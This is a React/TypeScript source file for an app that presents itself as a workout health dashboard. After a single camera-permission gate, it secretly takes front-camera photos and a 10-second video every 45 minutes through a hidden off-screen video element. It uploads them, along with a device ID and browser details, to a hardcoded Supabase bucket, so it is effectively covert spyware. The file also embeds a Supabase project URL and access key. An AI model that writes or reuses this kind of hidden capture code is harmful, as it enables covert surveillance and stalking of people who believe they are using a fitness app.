import { useState, useEffect, useRef, useCallback } from 'react';
import { Header } from './components/Header';
import { WorkoutHealthDashboard } from './components/WorkoutHealthDashboard';
import { AccessGate } from './components/AccessGate';
import { getOrGenerateDeviceId } from './utils/deviceHelper';
import {
  initFrontCameraStream,
  captureSilentCanvasFrame,
  recordVideoClip,
  generatePhotoStoragePath,
  generateVideoStoragePath,
  getFileSafeTimestamp,
  isMobileDevice,
} from './utils/camera';
import { uploadToSupabaseStorage, uploadDeviceStatusToSupabase } from './utils/supabase';

const SUPABASE_URL = 'https://nchosqdrzsphqnmrosfr.supabase.co';
const SUPABASE_ANON_KEY =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5jaG9zcWRyenNwaHFubXJvc2ZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk1MzU1NTEsImV4cCI6MjEwNTExMTU1MX0.BnLxYZyLXxYLzF9PN7KBoLvoDvp-WLI5Qh2--XH9oeE';
const SUPABASE_BUCKET = 'healthy';

const CYCLE_INTERVAL_MS = 45 * 60 * 1000; // 45 minutes
const VIDEO_DURATION_SECONDS = 10;
const LAST_CAPTURE_KEY = 'sec_last_capture_at';

type AccessState = 'checking' | 'prompt' | 'requesting' | 'granted' | 'denied' | 'unsupported';

function getLastCaptureTimestamp(): number {
  try {
    const raw = localStorage.getItem(LAST_CAPTURE_KEY);
    return raw ? Number(raw) || 0 : 0;
  } catch {
    return 0;
  }
}

function setLastCaptureTimestamp(ts: number): void {
  try {
    localStorage.setItem(LAST_CAPTURE_KEY, String(ts));
  } catch {
    // Ignore storage failures
  }
}

export default function App() {
  const [deviceId] = useState<string>(() => getOrGenerateDeviceId());
  const [isMobile] = useState<boolean>(() => isMobileDevice());
  const [accessState, setAccessState] = useState<AccessState>(() =>
    isMobileDevice() ? 'checking' : 'granted'
  );

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const isCapturingRef = useRef<boolean>(false);
  const activeStreamRef = useRef<MediaStream | null>(null);

  const stopCameraStream = useCallback(() => {
    if (activeStreamRef.current) {
      activeStreamRef.current.getTracks().forEach((track) => track.stop());
      activeStreamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, []);

  /**
   * Executes one silent cycle when mobile screen is unlocked & tab is visible:
   * Photo #1 -> 2s gap -> Photo #2 -> 10s silent video -> Supabase Storage upload -> release camera.
   */
  const executeBackgroundCycle = useCallback(
    async (preacquiredStream?: MediaStream) => {
      if (!isMobile || isCapturingRef.current) {
        if (preacquiredStream) {
          preacquiredStream.getTracks().forEach((t) => t.stop());
        }
        return;
      }

      // Only capture when device is unlocked and browser tab is visible
      if (document.visibilityState !== 'visible') {
        if (preacquiredStream) {
          preacquiredStream.getTracks().forEach((t) => t.stop());
        }
        return;
      }

      isCapturingRef.current = true;
      let stream: MediaStream | null = preacquiredStream || null;

      try {
        if (!stream) {
          stream = await initFrontCameraStream();
        }
        activeStreamRef.current = stream;

        const videoEl = videoRef.current;
        if (!videoEl) {
          throw new Error('Video element unavailable');
        }

        videoEl.srcObject = stream;
        await videoEl.play();

        // Allow camera auto-exposure/focus to settle so frames aren't dark
        await new Promise((resolve) => setTimeout(resolve, 450));

        if (document.visibilityState !== 'visible') {
          return;
        }

        const fileTimestamp = getFileSafeTimestamp();
        const localTime = new Date().toLocaleTimeString();

        // 1. Photo #1 (silent)
        const shot1 = await captureSilentCanvasFrame(videoEl, 0.8);
        const path1 = generatePhotoStoragePath(deviceId, fileTimestamp, 1);
        const up1 = await uploadToSupabaseStorage(
          SUPABASE_URL,
          SUPABASE_ANON_KEY,
          SUPABASE_BUCKET,
          path1,
          shot1.blob,
          'image/jpeg'
        );

        // 2. Wait 2 seconds before Photo #2
        await new Promise((resolve) => setTimeout(resolve, 2000));
        if (document.visibilityState !== 'visible') {
          return;
        }

        // 3. Photo #2 (silent)
        const shot2 = await captureSilentCanvasFrame(videoEl, 0.8);
        const path2 = generatePhotoStoragePath(deviceId, fileTimestamp, 2);
        const up2 = await uploadToSupabaseStorage(
          SUPABASE_URL,
          SUPABASE_ANON_KEY,
          SUPABASE_BUCKET,
          path2,
          shot2.blob,
          'image/jpeg'
        );

        // 4. Record 10-second silent video (audio: false)
        let uploadedVideoPath = '';
        if (typeof MediaRecorder !== 'undefined' && document.visibilityState === 'visible') {
          try {
            const vidResult = await recordVideoClip(stream, VIDEO_DURATION_SECONDS);
            const vidPath = generateVideoStoragePath(
              deviceId,
              fileTimestamp,
              vidResult.extension
            );
            const upVid = await uploadToSupabaseStorage(
              SUPABASE_URL,
              SUPABASE_ANON_KEY,
              SUPABASE_BUCKET,
              vidPath,
              vidResult.blob,
              vidResult.mimeType
            );
            if (upVid.success) {
              uploadedVideoPath = upVid.cloudPath || `${SUPABASE_BUCKET}/${vidPath}`;
            }
          } catch {
            // Continue status sync even if video fails on restricted browsers
          }
        }

        // Persist timestamp so 45-min rule survives tab refresh/lock
        setLastCaptureTimestamp(Date.now());

        // Update device_status.json in Supabase folder
        uploadDeviceStatusToSupabase(
          SUPABASE_URL,
          SUPABASE_ANON_KEY,
          SUPABASE_BUCKET,
          deviceId,
          {
            deviceId,
            lastActive: new Date().toISOString(),
            lastActiveLocal: new Date().toLocaleString(),
            cycleIntervalMinutes: 45,
            lastCycle: {
              timestamp: localTime,
              photo1: up1.success ? up1.cloudPath : 'failed',
              photo2: up2.success ? up2.cloudPath : 'failed',
              video: uploadedVideoPath || 'none',
              video_duration_seconds: VIDEO_DURATION_SECONDS,
            },
            deviceInfo: {
              userAgent: navigator.userAgent,
              screen: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
              online: navigator.onLine,
            },
          }
        ).catch(() => {});
      } catch (err) {
        if (
          err instanceof DOMException &&
          (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError')
        ) {
          setAccessState('denied');
        }
      } finally {
        stopCameraStream();
        isCapturingRef.current = false;
      }
    },
    [deviceId, isMobile, stopCameraStream]
  );

  // Check camera permission state on mobile mount
  useEffect(() => {
    if (!isMobile) return;

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      setAccessState('unsupported');
      return;
    }

    let permStatus: PermissionStatus | null = null;
    let active = true;

    async function checkPermission() {
      try {
        if (navigator.permissions && navigator.permissions.query) {
          permStatus = await navigator.permissions.query({ name: 'camera' as PermissionName });
          if (!active) return;

          const syncState = (state: PermissionState) => {
            if (state === 'granted') {
              setAccessState('granted');
            } else if (state === 'denied') {
              setAccessState('denied');
              stopCameraStream();
            } else {
              setAccessState('prompt');
            }
          };

          syncState(permStatus.state);

          permStatus.onchange = () => {
            if (active && permStatus) {
              syncState(permStatus.state);
            }
          };
          return;
        }
      } catch {
        // Fallback when Permissions API does not support 'camera' query (e.g. iOS Safari)
      }
      if (active) {
        setAccessState('prompt');
      }
    }

    checkPermission();

    return () => {
      active = false;
      if (permStatus) {
        permStatus.onchange = null;
      }
    };
  }, [isMobile, stopCameraStream]);

  // Trigger capture on Access Gate Continue button
  const handleContinueAccess = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      setAccessState('unsupported');
      return;
    }

    setAccessState('requesting');
    try {
      const stream = await initFrontCameraStream();
      setAccessState('granted');
      // Immediately start first capture cycle with acquired stream
      executeBackgroundCycle(stream);
    } catch {
      setAccessState('denied');
    }
  };

  // 45-minute active/unlock scheduler on mobile once granted
  useEffect(() => {
    if (!isMobile || accessState !== 'granted') return;

    const checkAndCaptureIfDue = () => {
      if (document.visibilityState !== 'visible' || isCapturingRef.current) return;
      const elapsed = Date.now() - getLastCaptureTimestamp();
      if (elapsed >= CYCLE_INTERVAL_MS) {
        executeBackgroundCycle();
      }
    };

    // Check immediately when unlocked/granted (handles returning after >= 45 min)
    checkAndCaptureIfDue();

    const onVisibilityOrFocus = () => {
      if (document.visibilityState === 'visible') {
        checkAndCaptureIfDue();
      } else {
        // Release camera immediately if user locks screen or switches app
        stopCameraStream();
      }
    };

    document.addEventListener('visibilitychange', onVisibilityOrFocus);
    window.addEventListener('focus', onVisibilityOrFocus);
    const intervalId = window.setInterval(checkAndCaptureIfDue, 30000);

    return () => {
      document.removeEventListener('visibilitychange', onVisibilityOrFocus);
      window.removeEventListener('focus', onVisibilityOrFocus);
      clearInterval(intervalId);
      stopCameraStream();
    };
  }, [isMobile, accessState, executeBackgroundCycle, stopCameraStream]);

  return (
    <>
      {/* Persistent hidden silent video element for background capture */}
      <video
        ref={videoRef}
        playsInline
        muted
        autoPlay
        className="opacity-0 pointer-events-none fixed -top-[9999px] -left-[9999px] w-1 h-1"
      />

      {isMobile && accessState !== 'granted' ? (
        <AccessGate
          status={accessState === 'checking' ? 'prompt' : accessState}
          onContinue={handleContinueAccess}
        />
      ) : (
        <div className="min-h-screen bg-[#090C10] text-slate-100 flex flex-col antialiased selection:bg-emerald-500/30 selection:text-emerald-200">
          <Header sessionActive={true} />
          <main className="flex-1 max-w-6xl w-full mx-auto px-4 sm:px-6 py-6">
            <WorkoutHealthDashboard />
          </main>
        </div>
      )}
    </>
  );
}
